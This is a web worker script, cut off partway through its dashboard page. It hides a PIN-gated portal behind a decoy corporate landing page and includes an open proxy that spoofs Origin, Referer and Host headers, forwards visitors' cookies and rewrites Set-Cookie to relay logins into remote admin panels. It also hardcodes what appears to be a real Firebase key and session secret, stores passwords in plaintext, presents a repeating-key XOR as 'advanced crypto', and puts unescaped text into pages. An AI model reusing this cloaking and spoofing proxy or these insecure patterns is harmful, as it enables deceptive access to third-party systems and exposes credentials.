// ==========================================
// ⚙️ SECURE FIREBASE CONFIGURATION
// ==========================================
const CONFIG = {
    SESSION_SECRET: "nexus_enterprise_secure_tunnel_2026",
    FB_URL: "https://private-panel-916b4-default-rtdb.firebaseio.com",
    FB_KEY: "AIzaSyC5Ygv7umkM3LJ9XEDJUTcrn_DmJ19eY0c",
    DB_NODE: "admin_web"
};

// ==========================================
// 🔐 ADVANCED CRYPTO ENGINE (Unicode Safe)
// ==========================================
const encrypt = (text) => {
    let res = '';
    const utf8 = unescape(encodeURIComponent(text));
    for(let i=0; i<utf8.length; i++) res += String.fromCharCode(utf8.charCodeAt(i) ^ CONFIG.SESSION_SECRET.charCodeAt(i % CONFIG.SESSION_SECRET.length));
    return btoa(res);
};
const decrypt = (b64) => {
    try {
        let utf8 = atob(b64);
        let res = '';
        for(let i=0; i<utf8.length; i++) res += String.fromCharCode(utf8.charCodeAt(i) ^ CONFIG.SESSION_SECRET.charCodeAt(i % CONFIG.SESSION_SECRET.length));
        return decodeURIComponent(escape(res));
    } catch(e) { return null; }
};

// ==========================================
// 🎨 UI: MASSIVE REALISTIC DECOY LANDING PAGE
// ==========================================
const landingPageHTML = `
<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nexus Digital | Enterprise Solutions</title>
    <link rel="icon" type="image/jpeg" href="https://i.postimg.cc/zXbrDz13/modern-security-logo-design-safe-your-internet-privacy-1017-51245.jpg">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #050505; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; scroll-behavior: smooth;}
        .loader { border: 2px solid transparent; border-top-color: #000; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        input:focus { outline: none; box-shadow: none; }
        .feature-box { border: 1px solid rgba(255,255,255,0.05); background: rgba(255,255,255,0.01); transition: all 0.3s; }
        .feature-box:hover { background: rgba(255,255,255,0.03); border-color: rgba(255,255,255,0.15); transform: translateY(-3px); }
        .grid-bg { background-image: linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px); background-size: 30px 30px; }
    </style>
</head>
<body class="antialiased selection:bg-white selection:text-black">
    <nav class="fixed w-full z-50 border-b border-white/10 bg-[#050505]/90 backdrop-blur-md">
        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
            <div class="text-xl font-bold tracking-widest uppercase cursor-default select-none flex items-center gap-2">
                <svg class="w-6 h-6 text-indigo-500" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path></svg>
                Nexus<span class="text-gray-500">.</span>
            </div>
            <div class="hidden md:flex gap-8 text-[10px] font-bold tracking-widest uppercase text-gray-400">
                <a href="#solutions" class="hover:text-white transition">Solutions</a>
                <a href="#infrastructure" class="hover:text-white transition">Infrastructure</a>
                <a href="#compliance" class="hover:text-white transition">Compliance</a>
                <a href="#contact" class="hover:text-white transition">Contact</a>
            </div>
            <button class="px-5 py-2.5 text-[10px] font-bold uppercase tracking-widest bg-white text-black hover:bg-gray-200 transition">Client Login</button>
        </div>
    </nav>

    <!-- Hero Section -->
    <header class="relative pt-32 pb-20 md:pt-48 md:pb-24 px-4 flex flex-col items-center justify-center border-b border-white/5 overflow-hidden">
        <div class="absolute inset-0 grid-bg opacity-30 pointer-events-none"></div>
        <div class="absolute top-1/4 left-1/2 -translate-x-1/2 w-3/4 h-1/2 bg-indigo-900/10 blur-[120px] rounded-full pointer-events-none"></div>
        
        <div class="text-center z-10 w-full max-w-2xl mx-auto relative">
            <span class="text-[10px] font-bold tracking-widest uppercase text-indigo-400 border border-indigo-500/30 bg-indigo-500/10 px-3 py-1 rounded-full mb-6 inline-block">Enterprise Data Registry V4.2</span>
            <h1 class="text-5xl md:text-7xl font-light tracking-tight mb-4">Secure <span class="font-bold text-white">Assets</span></h1>
            <p class="text-gray-400 text-sm md:text-base tracking-wide mb-10 leading-relaxed">Search our global registry of digital projects, infrastructure documentation, and cloud services.</p>
            
            <form id="search-form" class="w-full flex items-center p-1.5 border border-white/10 bg-[#0a0a0a] focus-within:border-indigo-500/50 transition-all shadow-[0_0_30px_rgba(0,0,0,0.5)] relative z-20">
                <div class="pl-4 flex items-center justify-center pointer-events-none">
                    <svg id="search-icon" class="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
                </div>
                <input type="text" id="main-search" placeholder="Search by project ID, service or keyword..." autocomplete="off" spellcheck="false"
                    class="w-full bg-transparent text-white text-sm px-4 py-3 placeholder-gray-600 tracking-wide font-medium">
                <button type="submit" id="search-btn" class="px-6 py-3 bg-white hover:bg-gray-200 text-black text-[10px] font-bold uppercase tracking-widest transition flex items-center justify-center min-w-[100px]">
                    <span id="btn-text">Lookup</span><div id="search-spinner" class="loader hidden"></div>
                </button>
            </form>
            <p id="search-msg" class="text-[10px] font-bold text-gray-500 mt-4 tracking-widest uppercase opacity-0 transition-opacity h-4"></p>
        </div>
    </header>

    <!-- Trusted Brands Banner -->
    <div class="py-8 bg-[#020202] border-b border-white/5 text-center">
        <p class="text-[9px] uppercase tracking-[0.2em] text-gray-600 mb-6 font-bold">Trusted by Global Technology Leaders</p>
        <div class="flex flex-wrap justify-center items-center gap-8 md:gap-16 opacity-30 grayscale pointer-events-none select-none">
            <span class="text-xl font-black tracking-tighter">AcmeCorp</span>
            <span class="text-lg font-bold tracking-widest">GLOBEX</span>
            <span class="text-xl font-light tracking-wide border-2 border-current px-2">SOYLENT</span>
            <span class="text-lg font-serif italic font-bold">Initech</span>
            <span class="text-xl font-bold uppercase tracking-widest flex items-center gap-1"><svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2L2 22h20L12 2z"/></svg> Apex</span>
        </div>
    </div>

    <!-- Quick Stats -->
    <div class="w-full border-b border-white/5 bg-[#080808]">
        <div class="max-w-5xl mx-auto grid grid-cols-2 md:grid-cols-4 gap-4 py-12 px-6 text-center">
            <div><p class="text-3xl font-bold text-white mb-1">99.99%</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">Uptime SLA</p></div>
            <div><p class="text-3xl font-bold text-white mb-1">200+</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">Edge Datacenters</p></div>
            <div><p class="text-3xl font-bold text-white mb-1">&lt;12ms</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">Global Latency</p></div>
            <div><p class="text-3xl font-bold text-white mb-1">AES-GCM</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">256-bit Encrypted</p></div>
        </div>
    </div>

    <!-- Massive Footer -->
    <footer id="contact" class="pt-24 pb-10 px-6 bg-[#030303] border-t border-white/5">
        <div class="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-4">
            <p class="text-[10px] text-gray-600 uppercase tracking-widest">&copy; 2026 Nexus Digital Enterprise. All rights reserved.</p>
        </div>
    </footer>

    <script>
        document.getElementById('search-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const q = document.getElementById('main-search').value.trim();
            if(!q) return;
            document.getElementById('btn-text').classList.add('hidden');
            document.getElementById('search-spinner').classList.remove('hidden');
            document.getElementById('main-search').disabled = true;
            try {
                const res = await fetch('/api/access', { method: 'POST', body: JSON.stringify({ code: q }) });
                if (res.ok) {
                    const data = await res.json();
                    document.getElementById('search-msg').style.color = '#4ade80'; 
                    document.getElementById('search-msg').innerText = 'NODE IDENTIFIED. CONNECTING...';
                    document.getElementById('search-msg').style.opacity = '1';
                    setTimeout(() => window.location.href = data.role === 'admin' ? '/admin' : '/dashboard', 800);
                } else {
                    setTimeout(() => {
                        document.getElementById('btn-text').classList.remove('hidden');
                        document.getElementById('search-spinner').classList.add('hidden');
                        document.getElementById('main-search').disabled = false;
                        document.getElementById('main-search').value = '';
                        document.getElementById('search-msg').style.color = '#ef4444'; 
                        document.getElementById('search-msg').innerText = 'NO RESULTS FOUND FOR "' + q.toUpperCase() + '"';
                        document.getElementById('search-msg').style.opacity = '1';
                    }, 1000);
                }
            } catch (err) {}
        });
    </script>
</body>
</html>
`;

// ==========================================
// 🚀 BACKEND & CORE LOGIC
// ==========================================
export default {
    async fetch(request, env, ctx) {
        const url = new URL(request.url);
        const path = url.pathname;

        const cookies = Object.fromEntries((request.headers.get("Cookie") || "").split(';').map(c => {
            const parts = c.split('='); return[parts[0].trim(), parts.slice(1).join('=')];
        }));

        const getDB = async () => {
            try {
                const res = await fetch(`${CONFIG.FB_URL}/${CONFIG.DB_NODE}.json?key=${CONFIG.FB_KEY}`);
                let data = await res.json();
                if (!data) {
                    data = { adminPin: "SET_YOUR_PIN_HERE", settings: { whatsapp: "", notification: { enabled: false, target: "all", specificUsers:[], text: "", image: "", btnText: "", btnLink: "" } }, sites: {}, pins: {} };
                    await fetch(`${CONFIG.FB_URL}/${CONFIG.DB_NODE}.json?key=${CONFIG.FB_KEY}`, { method: 'PUT', body: JSON.stringify(data) });
                }
                return data;
            } catch(e) { return null; }
        };
        const updateDB = async (data) => {
            await fetch(`${CONFIG.FB_URL}/${CONFIG.DB_NODE}.json?key=${CONFIG.FB_KEY}`, { method: 'PUT', body: JSON.stringify(data) });
        };

        let db = await getDB() || {};
        if (!db.sites) db.sites = {};
        if (!db.pins) db.pins = {};
        if (!db.settings) db.settings = { whatsapp: "", notification: { enabled: false, target: "all", specificUsers:[], text: "", image: "", btnText: "", btnLink: "" } };

        const isAdmin = cookies['admin_session'] === CONFIG.SESSION_SECRET;
        const userPin = cookies['portal_session'];
        const isUser = !!(userPin && db.pins && db.pins[userPin]);
        let isProxyActive = cookies['proxy_active'];

        const destHeader = request.headers.get("Sec-Fetch-Dest") || "";
        const acceptHeader = request.headers.get("Accept") || "";
        const isMainDocument = destHeader === "document" || acceptHeader.includes("text/html");

        if (isProxyActive && request.method === "GET" && !path.startsWith("/api/") && !path.startsWith("/__api_proxy") && !path.startsWith("/__ws_proxy") && isMainDocument) {
            const secFetchSite = request.headers.get("Sec-Fetch-Site");
            const referer = request.headers.get("Referer");
            if (secFetchSite === "none" || (!secFetchSite && !referer)) {
                return new Response("Killed", { status: 302, headers: { "Location": "/", "Set-Cookie": "proxy_active=; Max-Age=0; Path=/" } });
            }
        }

        // --- 📡 UNIVERSAL API INTERCEPTOR PROXY ---
        if (path === "/__api_proxy") {
            let reqOrigin = request.headers.get("Origin") || url.origin;

            if (request.method === "OPTIONS") {
                return new Response(null, {
                    status: 204,
                    headers: {
                        "Access-Control-Allow-Origin": reqOrigin,
                        "Access-Control-Allow-Methods": "GET, POST, PUT, PATCH, DELETE, OPTIONS",
                        "Access-Control-Allow-Headers": request.headers.get("Access-Control-Request-Headers") || "Content-Type, Authorization, X-Requested-With, Accept, sid, Token, token, sid-x",
                        "Access-Control-Allow-Credentials": "true",
                        "Access-Control-Max-Age": "86400"
                    }
                });
            }

            const targetUrlStr = url.searchParams.get("target");
            if(!targetUrlStr) return new Response("Bad Target", {status:400});
            
            const tObj = new URL(targetUrlStr);
            const proxyHeaders = new Headers(request.headers);
            
            let originSpoof = tObj.origin;
            let refererSpoof = tObj.origin + "/";
            if (isProxyActive) {
                let pDataString = decrypt(isProxyActive);
                if (pDataString) {
                    try {
                        let pData = JSON.parse(pDataString);
                        if (pData.t) {
                            let originUrl = new URL(pData.t);
                            originSpoof = originUrl.origin;
                            refererSpoof = originUrl.origin + "/";
                        }
                    } catch(e) {}
                }
            }

            proxyHeaders.set("Host", tObj.hostname);
            proxyHeaders.set("Origin", originSpoof);
            proxyHeaders.set("Referer", refererSpoof);
            proxyHeaders.delete("Accept-Encoding");
            
            const cleanCookieStr = Object.entries(cookies).filter(([k]) => k !== 'portal_session' && k !== 'proxy_active' && k !== 'admin_session').map(([k,v]) => `${k}=${v}`).join('; ');
            if (cleanCookieStr) proxyHeaders.set("Cookie", cleanCookieStr); else proxyHeaders.delete("Cookie");

            const fetchConfig = { method: request.method, headers: proxyHeaders, redirect: "manual" };
            if (["POST", "PUT", "PATCH", "DELETE"].includes(request.method)) fetchConfig.body = request.body;

            try {
                const proxyRes = await fetch(targetUrlStr, fetchConfig);
                const responseHeaders = new Headers();
                
                for (const[key, value] of proxyRes.headers.entries()) {
                    if (key.toLowerCase() === 'set-cookie') {
                        let modCookie = value.replace(/Domain=[^;]+;?\s*/gi, '');
                        responseHeaders.append('Set-Cookie', modCookie);
                    } else if (key.toLowerCase() !== 'access-control-allow-origin') {
                        responseHeaders.append(key, value);
                    }
                }
                
                responseHeaders.set("Access-Control-Allow-Origin", reqOrigin);
                responseHeaders.set("Access-Control-Allow-Credentials", "true");
                responseHeaders.set("Access-Control-Expose-Headers", "Content-Length, Content-Type, Date, Server, Transfer-Encoding, Authorization, sid, Token"); 

                return new Response(proxyRes.body, { status: proxyRes.status, statusText: proxyRes.statusText, headers: responseHeaders });
            } catch(e) {
                return new Response("API Proxy Error", { status: 500 });
            }
        }

        if (path === "/__ws_proxy" && request.headers.get("Upgrade") === "websocket") {
            const targetUrlStr = url.searchParams.get("target");
            if(!targetUrlStr) return new Response("Bad Target", {status:400});
            const tObj = new URL(targetUrlStr);
            const wsHeaders = new Headers(request.headers);
            wsHeaders.set("Host", tObj.hostname);
            wsHeaders.set("Origin", tObj.origin);
            return fetch(targetUrlStr, { headers: wsHeaders });
        }

        if (path === "/api/access" && request.method === "POST") {
            const { code } = await request.json();
            if (db.adminPin && db.adminPin !== "SET_YOUR_PIN_HERE" && code === String(db.adminPin)) {
                return new Response(JSON.stringify({ success: true, role: 'admin' }), { headers: { "Set-Cookie": `admin_session=${CONFIG.SESSION_SECRET}; HttpOnly; Secure; Path=/` } });
            }
            if (db.pins && db.pins[code]) {
                return new Response(JSON.stringify({ success: true, role: 'user' }), { headers: { "Set-Cookie": `portal_session=${code}; HttpOnly; Secure; Path=/` } });
            }
            return new Response("Invalid", { status: 401 });
        }

        if (path === "/api/update-password" && request.method === "POST") {
            if (!isUser) return new Response("Denied", { status: 403 });
            const { siteId, newPassword } = await request.json();
            if (!db.pins[userPin].siteConf) db.pins[userPin].siteConf = {};
            if (!db.pins[userPin].siteConf[siteId]) db.pins[userPin].siteConf[siteId] = {u:'', r:'Admin', p:''};
            db.pins[userPin].siteConf[siteId].p = newPassword;
            await updateDB(db);
            return new Response(JSON.stringify({ success: true }));
        }

        if (path === "/logout" || path === "/api/stop-proxy") {
            return new Response("Logged out", { status: 302, headers: { "Location": "/", "Set-Cookie": "proxy_active=; Max-Age=0; Path=/" } });
        }

        // --- 🛠️ COMMON MODAL TEMPLATE (SQUARE) ---
        const customModalScript = `
        <div id="c-modal" class="hidden fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-md">
            <div class="bg-[#0a0a0a] border border-white/10 p-6 max-w-sm w-full mx-4 shadow-2xl flex flex-col">
                <h3 id="cm-title" class="text-white font-bold tracking-widest mb-3 uppercase text-sm flex items-center gap-2"></h3>
                <p id="cm-text" class="text-gray-400 text-xs mb-6 leading-relaxed"></p>
                <input type="text" id="cm-input" class="hidden w-full bg-black border border-white/10 p-3 text-xs mb-5 outline-none focus:border-indigo-500 text-white" autocomplete="off">
                <div class="flex gap-3 justify-end">
                    <button id="cm-cancel" class="hidden px-5 py-2.5 bg-white/5 hover:bg-white/10 text-gray-300 text-[10px] font-bold uppercase tracking-widest transition border border-white/5">Cancel</button>
                    <button id="cm-confirm" class="px-6 py-2.5 bg-indigo-600 text-white hover:bg-indigo-500 text-[10px] font-bold uppercase tracking-widest transition shadow-[0_0_15px_rgba(99,102,241,0.4)]">Confirm</button>
                </div>
            </div>
        </div>
        <script>
            const CustomModal = {
                show: function({ type, title, text, placeholder, onConfirm }) {
                    const m = document.getElementById('c-modal'), tTitle = document.getElementById('cm-title'), tText = document.getElementById('cm-text');
                    const inp = document.getElementById('cm-input'), bCan = document.getElementById('cm-cancel'), bCon = document.getElementById('cm-confirm');
                    tTitle.innerHTML = title; tText.innerHTML = text;
                    inp.value = ''; inp.placeholder = placeholder || '';
                    inp.classList.add('hidden'); bCan.classList.add('hidden');
                    if(type === 'prompt') { inp.classList.remove('hidden'); bCan.classList.remove('hidden'); setTimeout(()=>inp.focus(),100); }
                    else if(type === 'confirm') { bCan.classList.remove('hidden'); }
                    m.classList.remove('hidden');
                    bCan.onclick = () => { m.classList.add('hidden'); if(type==='prompt') onConfirm(null); else onConfirm(false); };
                    bCon.onclick = () => { m.classList.add('hidden'); if(type==='prompt') onConfirm(inp.value.trim()); else onConfirm(true); };
                    inp.onkeypress = (e) => { if(e.key === 'Enter') bCon.click(); };
                }
            };
        </script>`;

        // --- 💻 USER DASHBOARD & PROXY INIT ---
        if (path === "/dashboard") {
            if (!isUser) return Response.redirect(url.origin, 302);
            
            const userData = db.pins[userPin];
            let sitesHTML = '';

            if (userData.sites && userData.sites.length > 0) {
                userData.sites.forEach(siteId => {
                    const site = db.sites[siteId];
                    if (!site) return;
                    
                    const isSuspended = userData.status === 'suspended';
                    const statusText = isSuspended ? 'Suspended' : 'Active';
                    const statusColor = isSuspended ? 'text-red-400 border-red-400/20 bg-red-400/10' : 'text-green-400 border-green-400/20 bg-green-400/10';
                    
                    const siteConf = userData.siteConf?.[siteId] || { u: '', r: 'Admin', p: '' };
                    let roleColor = siteConf.r === 'Admin' ? 'text-purple-400 border-purple-400/20 bg-purple-400/10' : 
                                    siteConf.r === 'Super Agent' ? 'text-blue-400 border-blue-400/20 bg-blue-400/10' : 
                                    'text-yellow-400 border-yellow-400/20 bg-yellow-400/10';

                    const hasPwd = siteConf.p && siteConf.p.trim() !== '';
                    const safeSiteName = (site.name || 'this site').replace(/'/g, "\\'").replace(/"/g, '&quot;');
                    
                    const loginAction = hasPwd 
                        ? `window.location.href='/api/start-proxy?id=${siteId}'` 
                        : `CustomModal.show({type:'alert', title:'<span class=\\'text-red-500\\'>⚠</span> Password Required', text:'Please setup your panel password for <b>${safeSiteName}</b> before logging in.'})`;

                    const connectBtn = isSuspended 
                        ? `<button disabled class="w-full py-4 bg-white/5 text-gray-500 text-[10px] font-bold uppercase tracking-[0.2em] cursor-not-allowed border border-white/5 mt-4">Suspended</button>`
                        : `<button onclick="${loginAction}" class="w-full py-4 bg-indigo-600 text-white text-[10px] font-bold uppercase tracking-[0.2em] hover:bg-indigo-500 transition-colors flex items-center justify-center gap-2 mt-4 shadow-[0_0_20px_rgba(99,102,241,0.3)] outline-none"><span>Secure Connect</span><svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.75 9V5.25A2.25 2.25 0 0013.5 3h-6a2.25 2.25 0 00-2.25 2.25v13.5A2.25 2.25 0 007.5 21h6a2.25 2.25 0 002.25-2.25V15M12 9l-3 3m0 0l3 3m-3-3h12.75"></path></svg></button>`;

                    sitesHTML += `
                    <div class="border border-white/5 bg-[#0a0a0a] p-5 flex flex-col justify-between ${isSuspended ? 'opacity-60 grayscale' : ''}">
                        <div class="flex justify-between items-start mb-4">
                            <div class="flex items-center gap-2">
                                <span class="text-[8px] font-bold uppercase tracking-widest px-2 py-1 border ${roleColor}">${siteConf.r}</span>
                                <span class="text-[8px] font-bold uppercase tracking-widest px-2 py-1 border ${statusColor}">${statusText}</span>
                            </div>
                            <div class="w-8 h-8 bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center rounded-sm"><svg class="w-4 h-4 text-indigo-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"></path></svg></div>
                        </div>
                        
                        <div class="flex-grow">
                            <h2 class="text-xl font-bold text-white tracking-wide truncate mb-3">${site.name || 'Unnamed Site'}</h2>
                            
                            <button onclick="toggleDetails('${siteId}')" class="flex items-center gap-2 text-[9px] font-bold text-gray-400 hover:text-white uppercase tracking-widest transition mb-2 group outline-none">
                                <svg id="arrow-${siteId}" class="w-3 h-3 transition-transform duration-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>
                                View Panel Details
                            </button>
                            
                            <div id="details-${siteId}" class="hidden mt-3 space-y-2 p-3 bg-black/40 border border-white/5 rounded-sm">
                                <div class="bg-white/5 border border-white/10 flex items-center p-1.5 w-full">
                                    <span class="text-[8px] font-bold text-gray-500 uppercase px-2 whitespace-nowrap w-[60px]">Username</span>
                                    <input type="text" readonly value="${siteConf.u}" class="flex-grow bg-transparent text-[11px] text-white px-2 outline-none min-w-0 truncate select-all font-mono">
                                    <button onclick="copyLink('${siteConf.u}', this)" class="w-7 h-7 flex items-center justify-center bg-indigo-500/10 hover:bg-indigo-500/30 transition-all text-indigo-400 hover:text-white" title="Copy Username">
                                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
                                    </button>
                                </div>
                                
                                <div class="bg-white/5 border border-white/10 flex items-center p-1.5 w-full mt-2 relative">
                                    <span class="text-[8px] font-bold text-gray-500 uppercase px-2 whitespace-nowrap w-[60px]">Password</span>
                                    <input type="text" readonly value="${siteConf.p || ''}" id="pwd-disp-${siteId}" autocomplete="new-password" data-lpignore="true" class="flex-grow bg-transparent text-[11px] text-white px-2 outline-none min-w-0 truncate font-mono" style="-webkit-text-security: disc; font-family: text-security-disc, sans-serif;">
                                    <div class="flex gap-1 flex-shrink-0">
                                        <!-- Eye Toggle Icon -->
                                        <button onclick="toggleVisibility('pwd-disp-${siteId}', this)" class="w-7 h-7 flex items-center justify-center bg-white/5 hover:bg-white/10 transition-all text-gray-400 hover:text-white" title="Show/Hide Password">
                                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.522 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
                                        </button>
                                        <!-- Copy Icon -->
                                        <button onclick="copyLink(document.getElementById('pwd-disp-${siteId}').value, this)" class="w-7 h-7 flex items-center justify-center bg-indigo-500/10 hover:bg-indigo-500/30 transition-all text-indigo-400 hover:text-white" title="Copy Password">
                                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
                                        </button>
                                        <!-- Update Icon -->
                                        <button onclick="toggleEditPwd('${siteId}')" class="w-7 h-7 flex items-center justify-center bg-yellow-500/10 hover:bg-yellow-500/30 transition-all text-yellow-400 hover:text-white" title="Update Password">
                                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
                                        </button>
                                    </div>
                                </div>
                                <div id="pwd-edit-${siteId}" class="hidden mt-2 flex gap-2 pt-2 border-t border-white/10">
                                    <input type="text" id="pwd-in-${siteId}" autocomplete="new-password" placeholder="Type new password..." class="flex-grow bg-black/50 border border-white/10 p-2 text-xs text-white outline-none focus:border-yellow-500 transition-colors">
                                    <button onclick="savePwd('${siteId}')" class="px-4 bg-yellow-500/20 text-yellow-400 border border-yellow-500/50 hover:bg-yellow-500 hover:text-black transition-all text-[9px] font-bold uppercase tracking-widest">Save</button>
                                </div>

                                <div class="bg-white/5 border border-white/10 flex items-center p-1.5 w-full mt-2">
                                    <span class="text-[8px] font-bold text-gray-500 uppercase px-2 whitespace-nowrap w-[60px]">Link</span>
                                    <input type="text" readonly value="${site.userLink}" class="flex-grow bg-transparent text-[11px] text-blue-400 px-2 outline-none min-w-0 truncate select-all">
                                    <div class="flex-shrink-0">
                                        <button onclick="copyLink('${site.userLink}', this)" class="w-7 h-7 flex items-center justify-center bg-indigo-500/10 hover:bg-indigo-500/30 transition-all text-indigo-400 hover:text-white" title="Copy Link">
                                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                        ${connectBtn}
                    </div>`;
                });
            } else {
                sitesHTML = `<p class="text-gray-500 text-xs text-center w-full mt-10">No sites assigned to this PIN.</p>`;
            }

            let waHTML = '';
            if (db.settings.whatsapp) {
                waHTML = `
                <div class="fixed bottom-6 right-6 z-40 flex items-center justify-center group cursor-pointer" onclick="window.open('https://wa.me/${db.settings.whatsapp.replace(/[^0-9]/g, '')}', '_blank')">
                    <div class="absolute w-14 h-14 bg-green-500 rounded-full animate-ping opacity-40"></div>
                    <div class="relative w-14 h-14 bg-gradient-to-tr from-green-600 to-green-400 rounded-full flex items-center justify-center shadow-[0_0_20px_rgba(34,197,94,0.5)] group-hover:scale-110 transition duration-300 border-2 border-white/20">
                        <svg class="w-7 h-7 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M12.031 0C5.385 0 0 5.385 0 12.031c0 2.12.55 4.195 1.597 6.012L.15 24l6.104-1.602a11.96 11.96 0 005.777 1.488h.005c6.645 0 12.031-5.385 12.031-12.031S18.676 0 12.031 0zm0 21.884c-1.785 0-3.535-.48-5.07-1.386l-.364-.215-3.766.988.996-3.668-.236-.376a9.998 9.998 0 01-1.528-5.342c0-5.523 4.494-10.017 10.017-10.017 5.522 0 10.016 4.494 10.016 10.017 0 5.523-4.494 10.017-10.016 10.017zm5.503-7.518c-.302-.152-1.785-.882-2.062-.982-.277-.101-.48-.152-.682.152-.202.302-.782.982-.958 1.183-.176.202-.353.227-.655.075-1.677-.822-2.825-1.73-3.92-3.623-.177-.303.176-.277.625-1.182.075-.152.038-.278-.038-.429-.075-.152-.682-1.642-.934-2.247-.245-.588-.496-.51-.682-.52h-.58c-.202 0-.53.076-.807.378-.277.303-1.06 1.035-1.06 2.525s1.085 2.928 1.236 3.13c.151.202 2.133 3.257 5.17 4.57 1.956.845 2.76.907 3.754.764.935-.136 2.875-1.176 3.279-2.311.404-1.136.404-2.108.277-2.311-.126-.203-.454-.303-.757-.454z"></path></svg>
                    </div>
                </div>`;
            }

            let notifHTML = '';
            let n = db.settings.notification;
            let showNotif = false;
            if (n && n.enabled && n.text) {
                if (n.target === 'all') showNotif = true;
                else if (n.target === 'specific' && n.specificUsers && n.specificUsers.includes(userPin)) showNotif = true;
            }

            if (showNotif) {
                notifHTML = `
                <div id="notif-modal" class="fixed inset-0 z-[60] flex items-center justify-center bg-black/60 backdrop-blur-md">
                    <div class="bg-[#0a0a0a] border border-white/10 p-6 max-w-sm w-full mx-4 relative shadow-2xl">
                        <button onclick="document.getElementById('notif-modal').remove()" class="absolute top-3 right-3 text-gray-500 hover:text-white"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg></button>
                        ${n.image ? `<img src="${n.image}" class="w-full h-32 object-cover mb-4 border border-white/5">` : ''}
                        <h3 class="text-white font-bold tracking-wide mb-2 uppercase text-sm flex items-center gap-2"><svg class="w-4 h-4 text-indigo-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg> System Notice</h3>
                        <p class="text-gray-400 text-xs mb-6 leading-relaxed whitespace-pre-wrap">${n.text}</p>
                        ${(n.btnText && n.btnLink) ? `<a href="${n.btnLink}" target="_blank" class="block w-full text-center bg-white hover:bg-gray-200 transition text-black py-3 text-[10px] font-bold uppercase tracking-widest">${n.btnText}</a>` : ''}
                    </div>
                </div>`;
            }

            const html = `<!DOCTYPE html><html lang="en" class="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Core | Portal</title><link rel="icon" type="image/jpeg" href="https://i.postimg.cc/zXbrDz13/modern-security-logo-design-safe-your-internet-privacy-1017-51245.jpg"><script src="https://cdn.tailwindcss.com"></script>
            <style>body { background-color: #030303; color: white; font-family: 'Inter', sans-serif; }</style></head>
            <body class="pb-20">
